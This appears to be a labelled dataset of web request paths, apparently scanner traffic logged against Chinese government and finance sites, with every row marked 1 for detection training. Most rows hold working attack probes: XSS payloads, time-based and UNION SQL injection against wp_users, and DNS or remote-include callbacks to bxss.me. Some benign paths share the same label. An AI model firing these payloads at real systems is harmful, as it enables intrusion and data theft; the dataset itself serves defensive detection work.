sentences	labels
xxgk/******/tjj/tjjysqgk/gkcx/list.html?new="".gethostbyname(lc(""hitbn"".""qyiysvkz958f5.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(109).chr(78).chr(106).chr(80)."" 	 1
ztzl/********/hdnr/ 	 1
qhsw/******/2021/04/22'"/><img src=javascript:alert(2402) /013373702.shtml 	 1
publish/*****/10690/20577/javascript:; 	 1
about-southwest/******/2021-10-14/10953.html 	 1
kjcx/****/' and 'x'='y 	 1
index/******/2021/12/04/javascript:void(); 	 1
inc/******/common/newaccount.aspx?ddlculture=alert(777) 	 1
zwgk/czgk'""()&%<acx><script >5vc5(9837)</script>/****/gdyx/ 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(550)</script>?_=1630311515828 	 1
'.gethostbyname(lc('hitrp'.'roxjmtjqc1f52.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(81).chr(111).chr(73).'/*****/1088/1105/list.html 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(470)</script>?_=1630311423453 	 1
kjcx/****/gcdzyqzysjx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xwdt/****/1.htm 	 1
zwgk/******/bzxajgc/gys/jyx'||'.htm 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(727)">?_=1630311565792 	 1
hdjl/****/202103/t20210303_'""()&%<acx><script >0gna(9822)</script>.html 	 1
was5/***/search?channelid=299868&perpage=1000' and 7423=7423  	 1
ztpd/*********/hdzx/javascript:void(0); 	 1
e/******/viewclick/getall.php?classid=0'xor(if(now()=sysdate(),sleep(9),0))xor'z 	 1
pic/******/common/newaccount.aspx?btncancel=alert(777) 	 1
enclosure/************/data_back.php 	 1
news/********/yanjiubaogao?page=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
vc/**/widgets/hanweb'||'/placeholder/css/placeholder.css 	 1
zwgk/*****/5620/5642/\"javascript:void(0)\" 	 1
hdjl/****/http://bxss.me/t/fit.txt?.jpg/t20210303_2614145.html 	 1
newscenter/******/2021/11/02/javascript:void(); 	 1
index/******/2015/06/14/javascript:void(); 	 1
col/*****/index.html"" and ""x""=""y 	 1
module/**********/visit.jsp?i_webid[0]==2"and/**/extractvalue(1,concat(char(126),md5(1624595784)))and"and 3 in &i_columnid=1&i_webid[1]=3&type=1 	 1
rssdy/****/gallery1.php?g_name=<script>alert(77729</script> 	 1
61/********/xhr_send?t=1629433371354 	 1
jsearchfront/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1<esi:include src=""http://*******/rpb.png""/>&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') or 8524=8524  	 1
kjcx/****/zdkjcg/ and 1=1 	 1
zwgk/****/bmyjs/zzqfyxt/hnqrmfy/\"javascript:void(0)\" 	 1
qywh/****/jzgj/ 	 1
zwgk/****/bmjs/zzqfyxt/xxqrmfy/\"javascript:void(0)\" 	 1
newscenter/******/2021/09/07'"/><iframe src=javascript:alert(788) /013447361.shtml 	 1
bxss.me/********/jcse/110105008056111/16/images/plugin/category/js.js 	 1
newscenter/******/2021/09/07'"/><img src=javascript:alert(813)>/013447361.shtml 	 1
jinronglicai/*******/contact-us'||'/2017-01-24/193.html 	 1
module/********/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc and 5314=6198 	 1
zwgk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/wzs/hsbq/xmb_gzdxb.htm 	 1
news/********/quanqiuguanzhuredian?page=1' or 5615=5615 /* 	 1
prn/*********/index/41730?did=4&period=3"">alert(/777/) 	 1
xwdt/****/csjs/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/1.htm 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 0937=5410 and '1'='1 	 1
xxgk/******/201912/t20191216_240557.html' and 'x'='y 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24' and 7431=2165 and '1'='1&templet=1&token=1 	 1
cgi-bin/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 1
z/210514-1/*****/'""()&%<acx><script >rsbr(9513)</script>aa5449bf388d846409a3d11e199a08.css 	 1
xxgk/******/tjj%' and 2*3*8=6*8 and 'aw2d'!='aw2d%/ 	 1
'""()&%<acx><script >wopg(9339)</script>/**/widgets/scrollup/js/jquery.scrollup.min.js 	 1
modules/*******/path.php 	 1
system/********/code/datainput.jsp?owner=%' and 3723=0578 and '%%'='% 	 1
template/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
com1/**********/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> 	 1
ztpd/******/wlwm/javascript:void(0); 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/index.html 	 1
system/********/js/image%' and 2*3*8=6*8 and 'dtm6'!='dtm6%/imagescroll.js 	 1
xwzx/********/javascript:void(0); 	 1
vc/**/css'||'/page.css 	 1
news/********/fazhanzhanlue?page=1 and 8674=5211# 	 1
ztpd/******/count/0036001/008000000000/window.location.href 	 1
xwzx/****/2021_jtyw/202108/t20210819_314634.html and 1=1 	 1
zwgk/******/bzxajgc%' and 2*3*8=6*8 and 'pvd1'!='pvd1%/ycs/hlx.htm 	 1
module/**********/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1153603843')))&i_columnid=15&i_webid=1&type=3 	 1
/***********/5/xys.css 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4659)">?_=1630312093914 	 1
news/********/zijinqudao?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(19619)</script> 	 1
xxgk/'.gethostbyname(lc('hitxi'.'uisbjptq2376f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(109).chr(74).chr(118).chr(75).'/****/1105/list.html 	 1
xinanyanjiu/jinrongqihuo'||'/**********/ 	 1
zmhd/*****/hfswsj' and 2*3*8=6*8 and '734u'='734u/zmhdyc.html 	 1
jsearchfront"" and 2*3*8=6*8 and ""wce0""=""wce0/********/jcse/110105008056111/16/images/searchbtn.js 	 1
xwzx/****/2016hydt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
bxss.me/****/202001/t20200119_146666.html 	 1
libs/*********/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 1
news/********/siluyiliao?page=1 and 8605=8605# 	 1
cms/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=minsheng¤tpage=&columnarticlelistdeal_4g4_channelid_ss=channelid<alert(88952634)> 	 1
qhly/******/2021/11/10/javascript:dozoom(12) 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/1.htm 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/202107/t20210723_2938511.html 	 1
vc/**/lib/http://bxss.me/t/fit.txt?.jpg/themes/bootstrap/linkbutton.css 	 1
col/*******/index.html"" and ""x""=""x 	 1
ztpd/**********/images/ 	 1
if(now()=sysdate(),sleep(12),0)/****/jsgcxfjg/gzdt.htm 	 1
xq/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
con/*********/plugins/handwrite/index.php?id="">alert(777) 	 1
index/******/2020/11/21/javascript:window.print() 	 1
was5/***/search?channelid=299868' and 7461=6510  	 1
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &token=1 	 1
was5/***/search?channelid=299868%' or 6226=2695 and '%%'='%&perpage=1000 	 1
xwzx/****/jtwxq/" and "x"="y 	 1
jsearchfront%' and 2*3*8=6*8 and '2rdf'!='2rdf%/********/jcse/110105008056111/16/images/css.js 	 1
fr/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
xxgk/******/tjj/zfxxgkml_2127/xwfbh_2065/list<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
rssdy/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
news/********/jishuchuangxin?page=1' or 7062=7062 /* 	 1
newscenter/******/2014/11/28/011568963.shtml 	 1
zwgk'""()&%<acx><script >vtjw(9478)</script>/****/bmjs/qtdw/ 	 1
images/******/common/newaccount.aspx?email=alert(777) 	 1
wzdt/************/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783 	 1
system/********/interview/room.jsp?wbinterviewid=1033') and 7139=0711 and '1'='1&owner=1707212448 	 1
qhly/******/2016/08/29/javascript:window.close(); 	 1
news/********/redianguanzhu?page=1 and 5761=5761# 	 1
news/********/guojialingdaoren 	 1
xwdt/****/if(now()=sysdate(),sleep(12),0)/gzdt/145.htm 	 1
2017zt/******/2017/10/28/javascript:window.close(); 	 1
images/*/phone.js/"><script>alert(7549)</script> 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/******/tjj/ 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10*/-->'""></iframe></script></style></title></textarea><script >alert(75666)</script> 	 1
ztzl/****/bsap/ and 1=1 	 1
z/***/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> 	 1
2013zt/***/js/jquery-1.4a2.min.js/"><script>alert(47)</script> 	 1
database/**/editor/third-party/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xinanyanjiu/*************/nongchanpin/2021-0'xor(if(now()=sysdate(),sleep(12),0))xor'z-14/1705.html 	 1
news/********/yidaiyilubaike?page=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
qhly/******/2007/08/08/javascript:window.close(); 	 1
zwgk/****/bmyjs/zzqfyxt/ycxzjrmfy/\"javascript:void(0)\" 	 1
zxgg/********/javascript:void(0); 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/kjybzde/gzdt/1.htm 	 1
aux/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
xwzx/****/2015_mtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
was5/***/search?channelid=-1) or 9367=9367#&perpage=1000 	 1
col/*****/index.html/"><script>alert(468)</script> 	 1
system/resource%' and 2*3*8=6*8 and 'u44k'!='u44k%/**/language.js 	 1
zwgk/zdlygk'||'/********/gys/bsj/zcwj.htm 	 1
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/jquery/jquery-latest.min.js 	 1
xwzx/****/2019_mtgz/' and 'x'='y 	 1
art/****/3/12/art_31_17187.html 	 1
con/****/tipsloginsubmit.action 	 1
fxgg/********/javascript:void(0); 	 1
nbfw/*******/diary/new/submit.php 	 1
xxgk/*******/ybjsqzn/list.html 	 1
pic/*/00/75/28/752802_538638.jpg 	 1
template/*******/diary/new/submit.php 	 1
jsearchfront/********/'""()&%<acx><script >f58x(9015)</script>/110105008056111/16/images/plugin/websitechange/zwdt_v3.css 	 1
2016zt/******/2016/12/22/javascript:void(); 	 1
module/***/rssfeed.jsp?colid=34 and 5511=5511 	 1
news/********/touzizixun 	 1
searchfinancial.jspx?channelid=1480&producttype=2&querystr=1<esi:include src=""http://*******/rpb.png""/>&renew=0&termtype=0 	 1
socket.gethostbyname('hitaf' 'xnpjzolz0be83.bxss.me.')[3].to_s) '/**/images/ui.css 	 1
n42812/******/n42825/n1588869'||'/c1589219/content.html 	 1
lcgg/********/javascript:void(0); 	 1
system/********/interview/room.jsp?wbinterviewid=1033%') or 7793=3910  	 1
zwgk/****/bmjs/zzqzx/zzqzxbgt/\"javascript:void(0)\" 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(522)</script>?_=1630311501948 	 1
bdt/****/index.shtml/<img src="javascript:alert(218)"> 	 1
2017zt/******/2018/01/28/javascript:window.close(); 	 1
lz/******/2021/10/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/***********/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html 	 1
ztpd/******/2020/06/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
images/*******/hanweb.css 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3608)">?_=1630311970851 	 1
system/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/**/news/newscontent.js 	 1
lcgg1/********/javascript:void(0); 	 1
jsearchfront/********/jcse/'""()&%<acx><script >efoq(9230)</script>/16/images/hanweb.css 	 1
zmhd/*****/"".gethostbyname(lc(""hitts"".""cglllteue3abf.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(84).chr(110).chr(82).""/zmhdyc.html 	 1
vc/ui"" and 2*3*8=6*8 and ""tj15""=""tj15/***/easyui/themes/bootstrap/messager.css 	 1
lz/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
system/if(now()=sysdate(),sleep(12),0)/**/news/newscontent.js 	 1
e/******/viewclick/?addclick=-1; waitfor delay '0:0:4.2989999999999995' -- &classid=94&id=163 	 1
ywly/*****/' and 'x'='y 	 1
xwdt/zjdt'||'/****/gzdt/1.htm 	 1
was5/***/search?searchword=1&channelid=287219' or 4517=4517  	 1
newscenter/******/2010/02/23/010065617.shtml 	 1
module/*****/if(now()=sysdate(),sleep(15),0)/jquery.ad-gallery2.css 	 1
zwgk/******/ncwywfgz/zws'||'/znx/xmb_gzdxb.htm 	 1
2016zt/******/2016/12/19/javascript:window.print() 	 1
qhly/******/2017/04/05/javascript:dozoom(14) 	 1
qhly/******/2020/12/03/javascript:window.print() 	 1
'""()&%<acx><script >sm0f(9391)</script>/******/2013/list.html 	 1
2021zt/******/2021/12/21/javascript:window.close(); 	 1
pic/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' or 6318=6318 and '%'='&owner=1707212448 	 1
zwgk/czgk'""()&%<acx><script >vtjw(9973)</script>/****/qtdw/ 	 1
z/210514-1/*****/bxss.me/t/xss.html? 	 1
newscenter/******/2021/11/04/javascript:void(0); 	 1
xxgk/******/tjj/zfxxgkml_2127/http://bxss.me/t/xss.html? 	 1
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=0.6905497045448936<esi:include src=""http://bxss.me/rpb.png""/> 	 1
kefuzhongxin/common-problem/****/2017-0'xor(if(now()=sysdate(),sleep(6),0))xor'z-15/406.html 	 1
xq/******/2020/11/11/javascript:void(0); 	 1
index/******/2020/12/01/javascript:void(0); 	 1
ztzl/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 1
'""()&%<acx><script >gva8(9790)</script>/*****/1088/1105/list.html 	 1
/***********/bysrd/201610/t20161016_531.html 	 1
e/******/viewclick/?addclick=1&classid=if(now()=sysdate(),sleep(9),0)&id=270 	 1
index/******/2021/12/10/javascript:void(0); 	 1
swld/******/2021/08/15/javascript:window.print() 	 1
en/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 1
qhsw/******/2020/04/01/javascript:void(); 	 1
socket.gethostbyname('hitwm' 'urffjzqs11013.bxss.me.')[3].to_s) '/******/list.html 	 1
lcgg/********/javascript:void(0); 	 1
ru/************/index?search="">alert(/777/) 	 1
js/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
socket.gethostbyname('hitne' 'cqvoatbv27e82.bxss.me.')[3].to_s) '/******/index.html 	 1
qhly/******/2016/04/15/javascript:window.print() 	 1
english/*******/art/index.shtml/"><script>alert(59)</script> 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 3900=8789 and '%'=' 	 1
ztzl/******/djbn_jthd/ 	 1
zwgk'||'/******/gytdsdfwzs/zzq/zcwj.htm 	 1
template/*************/ajax_managed_services.php 	 1
sites/*******/files/opn-post.php 	 1
xxgk/******/tjj/zfxxgkml_http://bxss.me/t/fit.txt?.jpg/hygq_2064/list.html 	 1
system/********/js/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/jquery-latest.min.js 	 1
xinanyanjiu/*************/heisebankuai/2021-06-16/javascript:void(0) 	 1
xxgk/******/201812/t20181213_198700.html' and 'x'='y 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4988)">?_=1630312235646 	 1
zzsl'||'/******/202107/t20210723_2938511.html 	 1
upload/***/www/201607/15171839f46w.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(46364)</script> 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/encrypt/jbase64.js 	 1
zfld/******/2021/11/30/javascript:window.close(); 	 1
xxgk/*****/1088/1110/bxss.me/t/xss.html? 	 1
2010zt/******/db/index.shtml/<img src="javascript:alert(539)"> 	 1
hdjl/****/\"javascript:void(0)\" 	 1
newscenter/******/2020/12/06/javascript:void(); 	 1
zmhd/*****/hfswsj/202109/t20210906_http://bxss.me/t/fit.txt?.jpg.html 	 1
socket.gethostbyname(""hitkh"" ""ibbotibv8416c.bxss.me."")[3].to_s) ""/**/lib/easyui/plugins/jquery.window.js 	 1
zwgk/*******/zfxxgkzd'||'/1.htm 	 1
vc/**/widgets/scrollup/css/if(now()=sysdate(),sleep(15),0)/image.css 	 1
module/********/down.jsp?i_id=194814&colid=72;select sleep(5) 	 1
_nuxt/********/select/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
rlzy/****/202010/t20201009_254278.html" and "x"="x 	 1
images'||'/***/main.css 	 1
ddjs/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
zfld/javascript:window.external.addfavorite('http://**************/zfld/','中共青海省委领导活动报道集');?wsdl 	 1
jsearchfront//***********/jcse/website.js 	 1
socket.gethostbyname('hitxz' 'cryipehm45601.bxss.me.')[3].to_s) '/*******/jquery.linkbutton.js 	 1
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqzrzyt/\"javascript:void(0)\" 	 1
index/******/2021/11/17/javascript:window.close(); 	 1
ztpd/******/count/0036001/017000000000/window.location.href 	 1
jsearchfront/********/jcse/110105008056111/16//xfs.bxss.me/main.css 	 1
bdt/******/2008/08/19/002581566.shtml 	 1
hqxx/********/e100963670.html 	 1
ztpd/******/common/newaccount.aspx?email=alert(777) 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1&type=1' and 'x'='y 	 1
wp-content/*******/azonpop/files/view/showpopup.php?popid=null /*!00000union*/ select 1,2,/*!00000group_concat(unhex(hex(md5(1234))),0x3c2f62723e,unhex(hex(md5(1234))))*/,4,5 /*!00000from*/ wp_users 	 1
lcgg/********/javascript:void(0); 	 1
xinanyanjiu/*************/nongchanpin/2021-01-14/if(now()=sysdate(),sleep(12),0).html 	 1
index/******/2013/01/16/011001919.shtml 	 1
com1/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
xxgk/******/tjj/zfxxgkml_'""()&%<acx><script >8m5j(9133)</script>/xwfbh_2065/list.html 	 1
swwj/******/2021/08/04/javascript:void(0); 	 1
xxgk/*****/1088/1091/list.html?new='.gethostbyname(lc('hitxx'.'cjsdturb68be0.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(70).chr(99).chr(77).' 	 1
module'||'/***/jpage/theme/simple/css/jpage.css 	 1
qhly/******/2020/12/04/javascript:dozoom(9) 	 1
xinanyanjiu/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_9.html 	 1
gjcp/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 1
xxgk/*******/t/xss.html? 	 1
qhly/******/2021/11/10/javascript:window.print() 	 1
cgi-bin/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
module/**********/visit.jsp?i_columnid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&i_webid=1&type=1 	 1
lxwm/******/common/newaccount.aspx?btncreateaccount=alert(777) 	 1
zwgk/******/ncwywfgz/if(now()=sysdate(),sleep(12),0)/znx/xmb_gzdxb.htm 	 1
kjcx/****/znzgjdqzdhzbyjs/201610/t20161014_103590.html" and "x"="y 	 1
lcgg/********/javascript:void(0); 	 1
sync/*******/download?challenge=</script><script>alert(document.domain)</script> 	 1
ztzl/****/qyddt/202005/t20200527_247881.html and 1>1 	 1
xxgk/http://*******/t/fit.txt?.jpg/tjj/zfxxgkml_2127/jgzn_2042/list.html 	 1
xwzx/****/ 	 1
lcxt/********/javascript:void(0); 	 1
e/******/viewclick/?addclick=-1; waitfor delay '0:0:8.629999999999999' -- &classid=243&id=8977 	 1
xxgk/******//xfs.bxss.me/ 	 1
ldzc/****/http://bxss.me/t/fit.txt/ 	 1
2017zt/******/2017/10/26/javascript:window.print() 	 1
qhsw/******/2021/04/22/013373702'"/>/</script/>/<svg/onload=alert(2568) width=100//>.shtml 	 1
kjcx/****/nljx/201501/t20150129_52356.html and 1=1 	 1
ldzc//***********/sz/202108/t20210806_185416.html 	 1
gjcp/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
newscenter/******/2021/10/22/javascript:void(0); 	 1
jsearchfront/********/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/plugin/voice/voice.css 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(577)</script>?_=1630311519791 	 1
ywly/****/gcsg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
ywly/*****/index.html?continent=) and 6122=6122# 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1') or 8847=4149  	 1
lz/******/2021/11/28/javascript:void(0); 	 1
ztpd/******/count/0036012/000000000000/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
swwj/******/2021/11/23/javascript:window.print() 	 1
ldzc/*****/202109/t20210924_186864.html?leader="".gethostbyname(lc(""hitit"".""fwzxdcbjfd12d.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(119).chr(90).chr(108).chr(75)."" 	 1
hdjl/****/"".gethostbyname(lc(""hitbh"".""mecchcyl14392.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(79).chr(115).chr(88).""/t20201225_2539623.html 	 1
bi-security-login/login.jsp?msi=false&redirect="><img/***/onerror=alert(document.domain)> 	 1
xwzx/****/2021_jtyw/202109/t20210922_316987.html 	 1
col/*****/index.html"" and ""x""=""x 	 1
was5/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
news/********/yanjiubaogao?page=1 and 6245=6245 	 1
jsearchfront/********/jcse'||'/110105008056111/16/images/result.css 	 1
nul/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
jsearchfront/********/jcse/110105008056111/16/images<esi:include src=""http://bxss.me/rpb.png""/>/jquery.waterfall.js 	 1
con/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 1
xxgk/******/tjj/zfxxgkml_2127/jgzn_2042/http://bxss.me/t/fit.txt.html 	 1
vc"" and 2*3*8=6*8 and ""jtyk""=""jtyk/**/css/page.css 	 1
zwgk/******/ncwywfgz/zws/znx/xmb_gzdxb'||'.htm 	 1
zwgk/****/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdzj/\"javascript:void(0)\" 	 1
xxgk/******/2011/list.html?new=bxss.me 	 1
images' and 2*3*8=6*8 and 've9c'='ve9c/***/lmy.css 	 1
e/******/viewclick/?addclick=1&classid=laytm9rz'; waitfor delay '0:0:13.707' -- &id=10226 	 1
vc/ui%' and 2*3*8=6*8 and '3zv1'!='3zv1%/***/security/crypto-js.js 	 1
xinanyanjiu/shangpinqihuo' and 2*3*8=6*8 and 'sgla'='sgla/***********/2021-01-14/1705.html 	 1
2021zt/******/2021/06/09/013399706'""/>\</script\>\<svg/onload=alert(2342) width=100\/>.shtml 	 1
jsearchfront/******/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&searchid=1&tpl=16&websiteid=110105008056111 	 1
system/********/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/news/newscontent.js 	 1
module/********/downfile.jsp?classid=0%' and 4469=1830 and '%'='&filename=5304f109c5a94f8296864a137b39f53b.xls 	 1
skin/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*********/jsencrypt.min.js 	 1
index/******/2021/11/05/javascript:void(0); 	 1
qhly/******/2009/08/03/javascript:window.print() 	 1
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061<esi:include src=""http://bxss.me/rpb.png""/>/list.html 	 1
'.gethostbyname(lc('hitrw'.'eneyvzki6c789.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(72).chr(112).chr(88).'/*******/ybjsqzn/list.html 	 1
jsearchfront/http://*******/t/fit.txt/jcse/110105008056111/16/images/main.css 	 1
zwgk/****/bmjs/zzqfyxt/szsszjrmfy/\"javascript:void(0)\" 	 1
xwdt/****/czjs/zcwj/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3499)">?_=1630311909102 	 1
fr/***/sources?resource=alert(/777/)&format=txt 	 1
qhly/******/2016/11/14/javascript:dozoom(9) 	 1
vc/**/lib/easyui/'""()&%<acx><script >8uvj(9915)</script>/jquery.window.js 	 1
socket.gethostbyname(""hithd"" ""erqdcurh149e4.bxss.me."")[3].to_s) ""/**/images/result.css 	 1
2020zt/******/2020/07/07/javascript:void(); 	 1
newscenter/******/2012/08/28/010867969.shtml 	 1
index/******/2019/09/26/javascript:void(0); 	 1
hqxx/********/e102801418.html 	 1
2016zt/******/2016/09/14/javascript:window.print() 	 1
newscenter/******/2013/08/16/011161502.shtml 	 1
col/******/index.html/"><script>alert(442)</script> 	 1
module/jslib' and 2*3*8=6*8 and 'xont'='xont/********/jquery.ad-gallery2.css 	 1
images/*/hanweb'""()&%<acx><script >mnpf(9819)</script>.css 	 1
art/****/10/11/art'||'_34_242320.html 	 1
qhly/******/2016/03/29/javascript:dozoom(14) 	 1
investors-garden/***/if(now()=sysdate(),sleep(12),0)_2.html 	 1
ldzc/****/202007/t20200701_168744.html?leader="".gethostbyname(lc(""hitow"".""jojiqievcadbd.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(90).chr(106).chr(67)."" 	 1
jsearchfront/********/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt?.jpg/selectpick/css.css 	 1
module/**********/visit.jsp?i_articleid=242318&i_columnid=34&i_webid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&type=3 	 1
was5/***/search?page=2&channelid=253477&searchword=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
lcgg1/********/javascript:void(0); 	 1
x241/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
xwdt/zjdt'||'/****/gzdt.htm 	 1
